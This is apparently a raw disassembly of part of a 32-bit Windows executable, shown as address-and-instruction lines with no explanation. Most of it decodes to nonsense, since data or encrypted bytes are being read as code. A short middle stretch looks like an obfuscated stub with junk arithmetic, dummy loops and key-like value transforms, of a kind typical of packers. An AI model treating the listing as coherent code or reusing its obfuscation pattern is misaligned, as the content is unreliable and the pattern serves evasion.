  41422a:	int    0x41
  41422c:	ror    DWORD PTR [edi-0x2045cc56],0x9a
  414233:	pop    edx
  414234:	in     al,dx
  414235:	and    al,0xa4
  414237:	mov    edx,0x7ab369cd
  41423c:	mov    bh,0xa
  41423e:	fistp  QWORD PTR [edx-0x1d3ea92f]
  414244:	and    ebp,DWORD PTR [edx-0x5215daec]
  41424a:	addr16 lock jno 0x41423e
  41424e:	inc    DWORD PTR [eax]
  414250:	sbb    cl,BYTE PTR [ebp-0x3952040c]
  414256:	and    BYTE PTR [ebp+0x1a802ad6],ch
  41425c:	mov    gs,esp
  41425e:	fdivp  st(7),st
  414260:	ss jmp 0x414293
  414263:	test   BYTE PTR [ebp+0x55],dl
  414266:	test   ebx,eax
  414268:	xchg   ebp,eax
  414269:	mov    al,0x84
  41426b:	jns    0x4142ba
  41426d:	cli    
  41426e:	jge    0x41423f
  414270:	shl    DWORD PTR [ebx+0x50],0xbb
  414274:	cwde   
  414275:	push   ecx
  414276:	mov    ecx,0x72e4bb24
  41427b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41427c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41427e:	mov    ah,cl
  414280:	stos   BYTE PTR es:[edi],al
  414281:	or     DWORD PTR [ecx],ecx
  414283:	jo     0x4142e8
  414285:	inc    ebx
  414286:	xlat   BYTE PTR ds:[ebx]
  414287:	stos   DWORD PTR es:[edi],eax
  414288:	mov    ebp,0x7052ef6e
  41428d:	sub    BYTE PTR [ebp+0x492922e9],cl
  414293:	sbb    edx,0x45de9bfd
  414299:	mov    cl,0xd7
  41429b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41429c:	shl    ebx,0xba
  41429f:	arpl   WORD PTR [ecx+0x271a474d],si
  4142a5:	cmp    eax,DWORD PTR [esp+ebp*4]
  4142a8:	jnp    0x414293
  4142aa:	lahf   
  4142ab:	cs xchg esp,eax
  4142ad:	dec    eax
  4142ae:	adc    BYTE PTR [edi+eax*2-0x670b167a],bh
  4142b5:	add    edx,DWORD PTR [ebx-0x1]
  4142b8:	xor    ebp,DWORD PTR [esi-0x2fe981de]
  4142be:	cmp    edi,DWORD PTR [ebx+0x40b4d941]
  4142c4:	loopne 0x414271
  4142c6:	lea    ecx,[ebp+ebp*2-0x507730ca]
  4142cd:	fisubr DWORD PTR [edx+0x422649e8]
  4142d3:	inc    esi
  4142d4:	or     eax,0x1e2a10e0
  4142d9:	pop    ecx
  4142da:	and    eax,DWORD PTR [esi-0x16]
  4142dd:	mov    ds:0x3c7a2d94,al
  4142e2:	add    BYTE PTR [ebp-0xe5c509],bh
  4142e8:	shl    DWORD PTR [eax],0xc1
  4142eb:	idiv   BYTE PTR [edi+0x4f]
  4142ee:	pop    ss
  4142ef:	inc    esi
  4142f0:	mov    ds:0x162d542,eax
  4142f5:	mov    ebx,0x76e22675
  4142fa:	call   0xa07eb3d8
  4142ff:	cmp    DWORD PTR [ecx+edi*1],ebx
  414302:	aad    0x50
  414304:	jge    0x4142d5
  414306:	mov    WORD PTR [edx+ecx*4-0x6b],?
  41430a:	pop    eax
  41430b:	add    eax,0x9e234b71
  414310:	mov    esp,0xdef7bc13
  414315:	jmp    0x98de736e
  41431a:	sub    edx,ebx
  41431c:	sbb    DWORD PTR ds:0x428647,edi
  414322:	sub    edx,esi
  414324:	add    DWORD PTR ds:0x42863f,ecx
  41432a:	xor    edx,eax
  41432c:	mov    ebx,DWORD PTR ds:0x42864f
  414332:	add    DWORD PTR ds:0x428623,ebx
  414338:	mov    DWORD PTR [ebp+0x8],edx
  41433b:	mov    edx,DWORD PTR [ebp+0x8]
  41433e:	inc    ebx
  41433f:	mov    ebx,DWORD PTR [ebp-0x58]
  414342:	sub    DWORD PTR ds:0x428663,0x42863f
  41434c:	add    edx,0x5708f1
  414352:	and    DWORD PTR ds:0x428647,0x6a8d
  41435c:	imul   edx,ebx
  41435f:	xor    ebx,ebx
  414361:	or     ebx,DWORD PTR ds:0x42861f
  414367:	adc    DWORD PTR ds:0x42860f,ebx
  41436d:	mov    DWORD PTR [ebp-0x58],edx
  414370:	mov    edx,DWORD PTR [ebp+0x8]
  414373:	mov    ebx,DWORD PTR [ebp-0x54]
  414376:	add    edx,0x64f893
  41437c:	sbb    DWORD PTR ds:0x4285ff,0x4a3d
  414386:	or     edx,ebx
  414388:	mov    DWORD PTR [ebp-0x54],edx
  41438b:	or     DWORD PTR ds:0x4285db,edx
  414391:	mov    edx,DWORD PTR [ebp+0x8]
  414394:	mov    DWORD PTR ds:0x428653,0x1a
  41439e:	cmp    DWORD PTR ds:0x428653,0x0
  4143a5:	je     0x4143df
  4143ab:	cmp    DWORD PTR ds:0x428653,0x25
  4143b2:	ja     0x4143df
  4143b8:	jmp    0x4143cd
  4143bd:	push   0x428034
  4143c2:	push   0x0
  4143c4:	push   DWORD PTR [ebp-0xc]
  4143c7:	call   DWORD PTR ds:0x4287ab
  4143cd:	mov    ebx,DWORD PTR ds:0x428653
  4143d3:	dec    ebx
  4143d4:	mov    DWORD PTR ds:0x428653,ebx
  4143da:	jmp    0x41439e
  4143df:	mov    ebx,DWORD PTR [ebp-0x50]
  4143e2:	add    DWORD PTR ds:0x42862f,0x3490
  4143ec:	add    edx,ecx
  4143ee:	xor    edx,ebx
  4143f0:	sbb    DWORD PTR ds:0x4285f3,edi
  4143f6:	mov    DWORD PTR [ebp-0x50],edx
  4143f9:	mov    edx,DWORD PTR [ebp+0x8]
  4143fc:	mov    ebx,DWORD PTR [ebp-0x4c]
  4143ff:	add    edx,edi
  414401:	add    DWORD PTR ds:0x42866b,0x26d2
  41440b:	and    edx,ebx
  41440d:	mov    DWORD PTR [ebp-0x4c],edx
  414410:	and    DWORD PTR ds:0x42862b,0x0
  41441a:	xor    edx,edx
  41441c:	xor    edx,DWORD PTR ds:0x42862b
  414422:	inc    edx
  414423:	mov    DWORD PTR ds:0x42862b,edx
  414429:	cmp    DWORD PTR ds:0x42862b,0x2c
  414430:	jbe    0x414453
  414436:	jmp    0x414446
  41443b:	push   0x42808e
  414440:	call   DWORD PTR ds:0x4287af
  414446:	cmp    DWORD PTR ds:0x42862b,0x1f
  41444d:	jb     0x41441a
  414453:	mov    edx,DWORD PTR [ebp+0x8]
  414456:	mov    ebx,DWORD PTR [ebp-0x48]
  414459:	lea    edx,[ebx+edx*1+0x241fcde]
  414460:	mov    DWORD PTR [ebp-0x48],edx
  414463:	mov    edx,DWORD PTR [ebp+0x8]
  414466:	mov    ebx,0xfa5e1521
  41446b:	sub    ebx,edx
  41446d:	add    ebx,DWORD PTR [ebp-0x44]
  414470:	mov    DWORD PTR [ebp-0x44],ebx
  414473:	mov    edx,DWORD PTR [ebp+0x8]
  414476:	xor    edx,eax
  414478:	add    edx,esi
  41447a:	jne    0x411f5b
  414480:	mov    edx,DWORD PTR [ebp-0xc]
  414483:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41448a:	mov    bl,BYTE PTR [ebp-0x1]
  41448d:	cmp    dl,bl
  41448f:	je     0x41b050
  414495:	mov    ecx,DWORD PTR [ebp-0x5c]
  414498:	mov    edx,DWORD PTR [ebp-0xc]
  41449b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4144a2:	mov    ebx,DWORD PTR [ebp+0xc]
  4144a5:	xor    ecx,eax
  4144a7:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ec]
  4144ae:	jne    0x41b184
  4144b4:	mov    ecx,DWORD PTR [ebp-0x5c]
  4144b7:	mov    edx,DWORD PTR [ebp+0xc]
  4144ba:	xor    ecx,eax
  4144bc:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ec]
  4144c4:	mov    edx,DWORD PTR [ebp-0x18]
  4144c7:	xor    edx,eax
  4144c9:	add    edx,esi
  4144cb:	cmp    ecx,edx
  4144cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4144d0:	mov    DWORD PTR [ebp+0x8],ecx
  4144d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4144d6:	je     0x41d62d
  4144dc:	xor    ecx,eax
  4144de:	add    ecx,esi
  4144e0:	mov    ecx,0x242ebcc
  4144e5:	je     0x41b0d8
  4144eb:	mov    edx,DWORD PTR [ebp+0x8]
  4144ee:	mov    ebx,DWORD PTR [ebp-0x8]
  4144f1:	xor    edx,eax
  4144f3:	xor    ebx,eax
  4144f5:	sub    edx,ebx
  4144f7:	sub    edx,esi
  4144f9:	xor    edx,eax
  4144fb:	mov    DWORD PTR [ebp+0x8],edx
  4144fe:	mov    edx,DWORD PTR [ebp+0x8]
  414501:	mov    ebx,DWORD PTR [ebp-0x58]
  414504:	add    edx,0x5708f1
  41450a:	imul   edx,ebx
  41450d:	jmp    0x4168ae
  414512:	dec    eax
  414513:	pop    DWORD PTR [eax+ebx*8-0x70f72485]
  41451a:	lea    ebx,[eax-0x3a]
  41451d:	push   edi
  41451e:	mov    ch,ch
  414520:	mov    dl,0x2
  414522:	cmp    ah,BYTE PTR [esi+0x7d]
  414525:	jp     0x414525
  414527:	pop    edi
  414528:	jp     0x4145a4
  41452a:	adc    DWORD PTR [eax+0x76],edi
  41452d:	test   ch,ch
  41452f:	aaa    
  414530:	nop
  414531:	push   edi
  414532:	and    edx,edx
  414534:	add    ebp,DWORD PTR [eax-0x77]
  414537:	jno    0x41451a
  414539:	mov    dl,0x4a
  41453b:	push   cs
  41453c:	sti    
  41453d:	add    ah,0x89
  414540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414541:	cdq    
  414542:	aam    0xd6
  414544:	or     eax,0x6cebc4bb
  414549:	add    DWORD PTR [ecx+0x17],esi
  41454c:	push   edi
  41454d:	push   0x9423da18
  414552:	sub    ecx,DWORD PTR [edi+0x704eb26b]
  414558:	push   cs
  414559:	jg     0x4145ad
  41455b:	push   ds
  41455c:	icebp  
  41455d:	push   esi
  41455e:	jge    0x41459d
  414560:	stos   BYTE PTR es:[edi],al
  414561:	loopne 0x414571
  414563:	sbb    DWORD PTR [ebp*2-0x3a04d698],eax
  41456a:	xchg   ecx,eax
  41456b:	jno    0x41458e
  41456d:	or     al,0x7f
  41456f:	mov    al,ds:0xd72cdf47
  414574:	jnp    0x4145e0
  414576:	in     eax,0x2
  414578:	leave  
  414579:	dec    edi
  41457a:	out    dx,al
  41457b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457c:	lods   al,BYTE PTR ds:[esi]
  41457d:	pushf  
  41457e:	jno    0x414598
  414580:	pop    eax
  414581:	mov    esi,DWORD PTR [ecx-0x17]
  414584:	jecxz  0x414602
  414586:	and    DWORD PTR [edx],ebx
  414588:	push   es
  414589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41458a:	addr16 daa 
  41458c:	push   edx
  41458d:	aaa    
  41458e:	loopne 0x41456a
  414590:	sbb    DWORD PTR [ecx],esi
  414592:	test   al,0x9f
  414594:	out    dx,eax
  414595:	jecxz  0x414555
  414597:	sbb    al,0x32
  414599:	sbb    bh,bh
  41459b:	or     al,0xb3
  41459d:	mov    ds:0xa0c8a2ec,eax
  4145a2:	pusha  
  4145a3:	dec    esi
  4145a4:	clc    
  4145a5:	xor    BYTE PTR [ebx+0x3],cl
  4145a8:	dec    esp
  4145a9:	dec    esp
  4145aa:	out    0x5a,eax
  4145ac:	in     eax,dx
  4145ad:	and    BYTE PTR [ecx],bl
  4145af:	cld    
  4145b0:	pop    eax
  4145b1:	adc    al,0x50
  4145b3:	fwait
  4145b4:	lods   al,BYTE PTR ds:[esi]
  4145b5:	sbb    BYTE PTR [esi+0x1b1b155f],bh
  4145bb:	sahf   
  4145bc:	ret    0xf9af
  4145bf:	dec    edi
  4145c0:	mov    BYTE PTR [edi+0x2d],0xe8
  4145c4:	pop    ebp
  4145c5:	push   esi
  4145c6:	dec    esi
  4145c7:	comiss xmm2,DWORD PTR [edi-0x4eb56119]
  4145ce:	jecxz  0x414593
  4145d0:	mov    edx,0x305283e6
  4145d5:	mov    ecx,DWORD PTR [edx]
  4145d7:	aam    0xfa
  4145d9:	in     al,dx
  4145da:	neg    DWORD PTR [edi+ecx*8]
  4145dd:	inc    esp
  4145de:	in     al,dx
  4145df:	adc    al,0xe
  4145e1:	in     al,0x7
  4145e3:	xor    edx,DWORD PTR [ecx+0x4905bdec]
  4145e9:	jae    0x41463a
  4145eb:	in     al,0x45
  4145ed:	lods   al,BYTE PTR ds:[esi]
  4145ee:	scas   al,BYTE PTR es:[edi]
  4145ef:	cmp    eax,0x1e1f1d92
  4145f4:	or     edi,DWORD PTR [ecx+0x4725418]
  4145fa:	in     al,0x86
  4145fc:	pop    ss
  4145fd:	popa   
  4145fe:	pop    eax
  4145ff:	pusha  
  414600:	dec    edx
  414601:	jb     0x4145af
  414603:	jle    0x414627
  414605:	push   eax
  414606:	mov    al,BYTE PTR [ecx+0x16]
  414609:	(bad)
  41460d:	aad    0x1a
  41460f:	xchg   esi,eax
  414610:	push   es
  414611:	es adc eax,0xc6369341
  414617:	inc    esp
  414618:	pusha  
  414619:	or     al,0x16
  41461b:	js     0x414698
  41461d:	push   0x7be7807
  414622:	test   DWORD PTR [eax],edi
  414624:	sbb    ebx,ebx
  414626:	mov    ebp,0xca757078
  41462b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41462c:	es xchg esp,eax
  41462e:	lock popf 
  414630:	pop    ecx
  414631:	daa    
  414632:	fmul   QWORD PTR [ebx-0xae9eb7f]
  414638:	dec    edx
  414639:	inc    esp
  41463a:	(bad)  
  41463b:	lods   eax,DWORD PTR ds:[esi]
  41463c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41463d:	mov    WORD PTR [eax+0x4ba4637e],fs
  414643:	xor    eax,0xd90ca4b0
  414648:	mov    ds:0x55a8088f,al
  41464d:	jo     0x414692
  41464f:	loope  0x4146bb
  414651:	dec    ebp
  414652:	sbb    BYTE PTR [bx+di+0x405f],bl
  414657:	ret    0x3738
  41465a:	and    al,0x6a
  41465c:	pop    edx
  41465d:	(bad)  
  41465e:	fnstenv [ebx]
  414660:	fs sbb al,0xa2
  414663:	adc    dl,dh
  414665:	inc    eax
  414666:	aad    0xe6
  414668:	xor    ah,BYTE PTR [esi+ebx*8]
  41466b:	out    0x8d,eax
  41466d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41466e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41466f:	pop    eax
  414670:	jl     0x414697
  414672:	outs   dx,BYTE PTR ds:[esi]
  414673:	mov    ebp,0x43340af7
  414678:	aam    0xb
  41467a:	jns    0x414631
  41467c:	cmp    dh,BYTE PTR [edx-0x47bf107]
  414682:	cmp    al,0x32
  414684:	imul   edx,DWORD PTR [ebx+esi*1-0x26],0x597a05b
  41468c:	add    al,0x8
  41468e:	out    dx,al
  41468f:	add    cx,0x5c
  414693:	popa   
  414694:	jo     0x4146f4
  414696:	add    esp,DWORD PTR [esi+esi*4+0x1e6d06c6]
  41469d:	mov    eax,ds:0xfa37ed08
  4146a2:	inc    esi
  4146a3:	jno    0x414721
  4146a5:	dec    esp
  4146a6:	mov    dh,0xf3
  4146a8:	test   eax,0xc536d766
  4146ad:	scas   al,BYTE PTR es:[edi]
  4146ae:	mov    esi,0xe6c26f33
  4146b3:	mov    eax,ds:0x1840e0b
  4146b8:	fwait
  4146b9:	add    al,0xd1
  4146bb:	add    al,0xb8
  4146bd:	and    DWORD PTR [edi],esp
  4146bf:	daa    
  4146c0:	cmp    eax,0x705ada84
  4146c5:	ds push es
  4146c7:	pusha  
  4146c8:	add    DWORD PTR [ebp+eiz*8+0x7e],ecx
  4146cc:	lock rcl ebx,0x87
  4146d0:	imul   eax,DWORD PTR [esi],0x3b
  4146d3:	mov    bh,0x3c
  4146d5:	mov    ecx,0x55fac548
  4146da:	(bad)  
  4146db:	js     0x4146f9
  4146dd:	xchg   ebx,eax
  4146de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146e0:	mov    ds:0xf1ecbe74,eax
  4146e5:	push   ebx
  4146e6:	outs   dx,BYTE PTR ds:[esi]
  4146e7:	mov    fs,WORD PTR [edi]
  4146e9:	setl   dl
  4146ec:	push   edi
  4146ed:	cmp    eax,0xb00ee968
  4146f2:	call   0x8eb9:0xa2ef40e2
  4146f9:	push   cs
  4146fa:	pop    es
  4146fb:	jbe    0x414683
  4146fd:	jl     0x414723
  4146ff:	dec    ecx
  414700:	call   0x7506f679
  414705:	imul   esi,DWORD PTR ds:0xa42a8e01,0x28
  41470c:	(bad)  
  41470d:	mov    ?,WORD PTR [ebx]
  41470f:	jg     0x414713
  414711:	ja     0x4146b2
  414713:	test   al,0xf9
  414715:	mov    DWORD PTR [esi-0x73],edx
  414718:	jl     0x4146ac
  41471a:	outs   dx,DWORD PTR ds:[esi]
  41471b:	fld    DWORD PTR [edi-0x7961100]
  414721:	ja     0x414795
  414723:	jo     0x4146f4
  414725:	lock data16 (bad) 
  414728:	div    BYTE PTR [ecx]
  41472a:	popf   
  41472b:	mov    ss,WORD PTR [ecx]
  41472d:	inc    ebp
  41472e:	int3   
  41472f:	inc    esp
  414730:	hlt    
  414731:	leave  
  414732:	call   0xcb47967a
  414737:	nop
  414738:	push   es
  414739:	(bad)  
  41473a:	jl     0x41477a
  41473c:	jle    0x4146d2
  41473e:	lock xchg ebx,eax
  414740:	adc    BYTE PTR [esi],bh
  414742:	stos   DWORD PTR es:[edi],eax
  414743:	mov    dh,0x78
  414745:	call   0x3920:0xd0459d22
  41474c:	stos   BYTE PTR es:[edi],al
  41474d:	pop    edx
  41474e:	mov    edx,0x633ae607
  414753:	aam    0xbc
  414755:	jg     0x4147d5
  414757:	nop
  414758:	cmp    eax,0x888cc12d
  41475d:	dec    esp
  41475e:	mov    al,ds:0x8980ee8d
  414763:	cwde   
  414764:	test   BYTE PTR [esi+edx*2-0x6908b64],al
  41476b:	sub    dh,BYTE PTR [edx]
  41476d:	xchg   ebx,eax
  41476e:	pop    ebp
  41476f:	and    al,0x52
  414771:	daa    
  414772:	fwait
  414773:	xchg   BYTE PTR [ecx],bl
  414775:	dec    edx
  414776:	adc    BYTE PTR [ecx+0x5f8260a2],0x51
  41477d:	dec    edx
  41477e:	ret    0xc1dc
  414781:	es scas eax,DWORD PTR es:[edi]
  414783:	cmp    esi,0xe31b58fd
  414789:	outs   dx,DWORD PTR ds:[esi]
  41478a:	mov    ch,BYTE PTR [ecx]
  41478c:	mov    cs,WORD PTR [ecx-0x422d2898]
  414792:	add    DWORD PTR [edi+0x2fd1c15e],ebp
  414798:	inc    esi
  414799:	xor    eax,0xe6b39fd0
  41479e:	jns    0x41472e
  4147a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147a1:	repz mov al,0xe5
  4147a4:	push   cs
  4147a5:	jl     0x4147d7
  4147a7:	adc    DWORD PTR ds:0x42b70b82,edi
  4147ad:	sbb    al,0xa3
  4147af:	xrelease xchg BYTE PTR ds:0x8f8e1668,bh
  4147b6:	jne    0x414776
  4147b8:	ins    BYTE PTR es:[edi],dx
  4147b9:	addr16 ffree st(4)
  4147bc:	lock in eax,0x66
  4147bf:	dec    edx
  4147c0:	jg     0x414745
  4147c2:	xor    BYTE PTR [edx],0x3d
  4147c5:	data16 adc al,0x8c
  4147c8:	sar    BYTE PTR [edi],cl
  4147ca:	lds    esi,FWORD PTR ds:0xc2165f05
  4147d0:	adc    DWORD PTR [ecx],ebp
  4147d2:	int3   
  4147d3:	iret   
  4147d4:	das    
  4147d5:	jmp    DWORD PTR [edx+0x18f96ee]
  4147db:	and    al,BYTE PTR [edx+ebx*1-0x15]
  4147df:	sub    DWORD PTR [ecx+0x23b32ff0],0x5ff8ed09
  4147e9:	xor    ebx,esi
  4147eb:	loopne 0x4147a3
  4147ed:	adc    eax,0xbe8108fe
  4147f2:	cld    
  4147f3:	push   es
  4147f4:	add    ebp,DWORD PTR [edx]
  4147f6:	add    bh,BYTE PTR [edi]
  4147f8:	repnz mov al,0xcd
  4147fb:	cs out 0x95,al
  4147fe:	pop    es
  4147ff:	nop
  414800:	mov    ds:0x18b2486,al
  414805:	xor    eax,0x57dddb07
  41480a:	mov    cl,BYTE PTR [ebp+0x247bb394]
  414810:	rcl    DWORD PTR [esi-0x7470b8e5],cl
  414816:	test   esi,esi
  414818:	inc    edx
  414819:	xchg   esp,eax
  41481a:	stc    
  41481b:	add    ebp,esp
  41481d:	xchg   ebx,eax
  41481e:	sti    
  41481f:	les    eax,FWORD PTR [eax-0x63]
  414822:	loopne 0x4147ae
  414824:	sub    al,0xc4
  414826:	xchg   esi,eax
  414827:	mov    ecx,0x32e11701
  41482c:	ja     0x414845
  41482e:	jns    0x4147c9
  414830:	test   DWORD PTR [edx+0x5463b4ee],ecx
  414836:	cmp    cl,BYTE PTR [ebp-0x36978b8d]
  41483c:	(bad)  
  41483d:	cs push 0xffffffaa
  414840:	cmp    DWORD PTR ss:[edx-0x5a],ebx
  414844:	sbb    bl,ah
  414846:	aam    0x83
  414848:	cdq    
  414849:	and    DWORD PTR [ebx+edi*4],esi
  41484c:	jne    0x4147ce
  41484e:	dec    ebx
  41484f:	mov    eax,ds:0x69be1856
  414854:	lahf   
  414855:	and    ebp,eax
  414857:	adc    eax,0x1adca2de
  41485c:	fstp   QWORD PTR [ebp+0x3c]
  41485f:	rol    DWORD PTR [ecx-0x54],cl
  414862:	sub    al,0x70
  414864:	inc    ebx
  414865:	cdq    
  414866:	cmp    al,0x9c
  414868:	cmp    cl,BYTE PTR [esi+0x7c3bd6a9]
  41486e:	frstor [edx+0x63]
  414871:	pushf  
  414872:	inc    ebx
  414873:	lds    ecx,FWORD PTR [eax]
  414875:	test   eax,0x1ad78c74
  41487a:	je     0x4148ae
  41487c:	xchg   BYTE PTR [edi-0x1063ee6c],dh
  414882:	pop    es
  414883:	sub    ebx,DWORD PTR [esi+0x132d5f24]
  414889:	xchg   BYTE PTR [ebp-0x68],ch
  41488c:	xchg   esi,eax
  41488d:	dec    eax
  41488e:	jp     0x4148e5
  414890:	xchg   DWORD PTR [edi],ebp
  414892:	icebp  
  414893:	mov    al,ds:0x10153a7b
  414898:	pop    ds
  414899:	mov    eax,ds:0xe3451140
  41489e:	dec    edi
  41489f:	mov    eax,DWORD PTR [ecx]
  4148a1:	pop    ss
  4148a2:	mov    DWORD PTR [ebp+0x1b],0xf9e5192e
  4148a9:	ins    BYTE PTR es:[edi],dx
  4148aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ab:	fdivr  QWORD PTR [eax-0xed5b1a9]
  4148b1:	(bad)  
  4148b2:	mov    dh,0xf5
  4148b4:	gs adc esi,esp
  4148b7:	ja     0x414902
  4148b9:	jmp    0x4148c3
  4148bb:	arpl   WORD PTR [esi],dx
  4148bd:	push   edi
  4148be:	outs   dx,BYTE PTR ds:[esi]
  4148bf:	xchg   esi,eax
  4148c0:	jg     0x41486e
  4148c2:	xchg   esp,eax
  4148c3:	popf   
  4148c4:	dec    esi
  4148c5:	xchg   edx,eax
  4148c6:	lods   al,BYTE PTR ds:[esi]
  4148c7:	fst    DWORD PTR [ecx]
  4148c9:	sahf   
  4148ca:	scas   al,BYTE PTR es:[edi]
  4148cb:	fbstp  TBYTE PTR [eax+ebx*4]
  4148ce:	or     DWORD PTR [edi+edx*8],0xfffffff3
  4148d2:	dec    eax
  4148d3:	fwait
  4148d4:	xor    eax,DWORD PTR [esi-0x68]
  4148d7:	sub    DWORD PTR ds:0x615bd86e,eax
  4148dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148df:	shr    dl,cl
  4148e1:	cli    
  4148e2:	hlt    
  4148e3:	test   al,0xd1
  4148e5:	out    0x25,al
  4148e7:	jnp    0x414941
  4148e9:	popf   
  4148ea:	jmp    0x41495d
  4148ec:	stc    
  4148ed:	or     eax,0xb7f9335a
  4148f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148f3:	outs   dx,DWORD PTR ds:[esi]
  4148f4:	inc    cx
  4148f6:	test   eax,esi
  4148f8:	stos   DWORD PTR es:[edi],eax
  4148f9:	lods   al,BYTE PTR ds:[esi]
  4148fa:	sti    
  4148fb:	(bad)  
  4148fc:	jl     0x41492c
  4148fe:	fldcw  WORD PTR [ebp+eiz*2-0x8]
  414902:	loopne 0x414952
  414904:	in     eax,0xf
  414906:	loopne 0x41489c
  414908:	xor    al,0xd0
  41490a:	inc    edi
  41490b:	mov    dh,dh
  41490d:	sar    BYTE PTR [ecx-0x348be180],cl
  414913:	sub    dl,cl
  414915:	out    dx,al
  414916:	out    0x45,al
  414918:	push   ss
  414919:	dec    ecx
  41491a:	adc    dl,bl
  41491c:	fistp  WORD PTR [esi-0x1f7b4c11]
  414922:	ret    
  414923:	inc    ecx
  414924:	fld    st(3)
  414926:	sub    BYTE PTR [edi-0x5f],ch
  414929:	aas    
  41492a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41492b:	xor    eax,0x3dee987f
  414930:	and    eax,0x9094db0a
  414935:	das    
  414936:	dec    esp
  414937:	mov    ecx,0x125d76fb
  41493c:	xor    ch,dh
  41493e:	test   BYTE PTR [ecx],0x42
  414941:	pop    esi
  414942:	jmp    0xd09038d0
  414947:	out    dx,al
  414948:	push   cs
  414949:	cmc    
  41494a:	dec    ch
  41494c:	in     al,dx
  41494d:	icebp  
  41494e:	or     al,ah
  414950:	xlat   BYTE PTR ds:[ebx]
  414951:	lahf   
  414952:	shl    DWORD PTR [ecx],1
  414954:	cmc    
  414955:	push   esp
  414956:	pop    ebx
  414957:	mov    al,ds:0xa6142e1d
  41495c:	adc    ebx,DWORD PTR [ecx]
  41495e:	sahf   
  41495f:	dec    ebp
  414960:	je     0x4149e1
  414962:	jns    0x41493d
  414964:	or     BYTE PTR [esi+0x39e03644],cl
  41496a:	sbb    esi,DWORD PTR [edi-0x1374fa55]
  414970:	rcl    DWORD PTR ds:0x1d6a28c,1
  414976:	dec    esp
  414977:	nop
  414978:	scas   eax,DWORD PTR es:[edi]
  414979:	cmp    ebx,DWORD PTR [esi+0x4c]
  41497c:	test   eax,0x70548e15
  414981:	popf   
  414982:	mov    ?,edx
  414984:	push   esi
  414985:	mov    edi,0xd8ac5e22
  41498a:	pop    edi
  41498b:	stos   DWORD PTR es:[edi],eax
  41498c:	mov    al,ds:0xb00e0f04
  414991:	daa    
  414992:	push   cs
  414993:	cld    
  414994:	pusha  
  414995:	or     BYTE PTR [esi-0x56],0x51
  414999:	xchg   ebx,eax
  41499a:	mov    WORD PTR [eax+0x75],?
  41499d:	aad    0x7e
  41499f:	ins    BYTE PTR es:[edi],dx
  4149a0:	in     eax,0xde
  4149a2:	xor    bl,BYTE PTR [esi-0x69]
  4149a5:	cli    
  4149a6:	sub    BYTE PTR [ecx-0x56],0x8a
  4149aa:	stc    
  4149ab:	rcl    ch,cl
  4149ad:	pop    ebx
  4149ae:	jbe    0x414937
  4149b0:	mov    ecx,0x338837a1
  4149b5:	out    0x32,al
  4149b7:	cmp    edi,esi
  4149b9:	(bad)  
  4149ba:	leave  
  4149bb:	cmp    dh,BYTE PTR [eax+0x6f912222]
  4149c1:	cld    
  4149c2:	in     al,dx
  4149c3:	test   BYTE PTR [eax+0x10c152a0],dh
  4149c9:	cmp    eax,0x248c0927
  4149ce:	mov    dx,0x93e9
  4149d2:	int    0xf8
  4149d4:	dec    esp
  4149d5:	jne    0x414a3b
  4149d7:	cmp    al,BYTE PTR [ebx]
  4149d9:	lds    esi,FWORD PTR fs:[esi-0x79da9321]
  4149e0:	xchg   BYTE PTR [edi-0x23],dh
  4149e3:	inc    ebp
  4149e4:	mov    bh,0x8e
  4149e6:	add    al,0x40
  4149e8:	rcr    DWORD PTR [ebx],1
  4149ea:	adc    ebx,esp
  4149ec:	adc    ecx,DWORD PTR [esi+0x179b8fd1]
  4149f2:	call   0xdf36:0x32f63b43
  4149f9:	or     edx,DWORD PTR [ecx]
  4149fb:	jae    0x4149ee
  4149fd:	mov    dl,0x57
  4149ff:	xor    BYTE PTR [ecx+esi*4],0xe1
  414a03:	icebp  
  414a04:	mov    ds:0x7ea87902,al
  414a09:	xor    al,0x0
  414a0b:	add    BYTE PTR [edx],cl
  414a0d:	in     eax,dx
  414a0e:	adc    al,0x81
  414a10:	pop    edx
  414a11:	push   ebp
  414a12:	inc    ebx
  414a13:	int3   
  414a14:	addr16 (bad) 
  414a16:	fucomip st,st(1)
  414a18:	or     bh,BYTE PTR [ebp-0x268bb7f8]
  414a1e:	mov    ch,0x1
  414a20:	loope  0x4149e1
  414a22:	(bad)  
  414a23:	pushf  
  414a24:	jge    0x414a5a
  414a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a27:	je     0x4149fa
  414a29:	xchg   DWORD PTR [ecx+ebp*8-0x41eb2ad5],esp
  414a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a31:	or     eax,0x97cacc1
  414a36:	adc    al,0x32
  414a38:	xchg   edx,edx
  414a3a:	mov    ds:0x11a53c1d,al
  414a3f:	fld    TBYTE PTR [ecx-0x76476359]
  414a45:	rcr    DWORD PTR [ebx],0x92
  414a48:	ds pushf 
  414a4a:	ret    
  414a4b:	mov    ebx,DWORD PTR [edx+eax*2-0x40]
  414a4f:	pop    ss
  414a50:	repnz rcl DWORD PTR [edx-0x6f80bfe3],1
  414a57:	popa   
  414a58:	cmp    BYTE PTR [eax+esi*4],al
  414a5b:	inc    ebp
  414a5c:	lea    edi,[ebx]
  414a5e:	in     eax,dx
  414a5f:	clc    
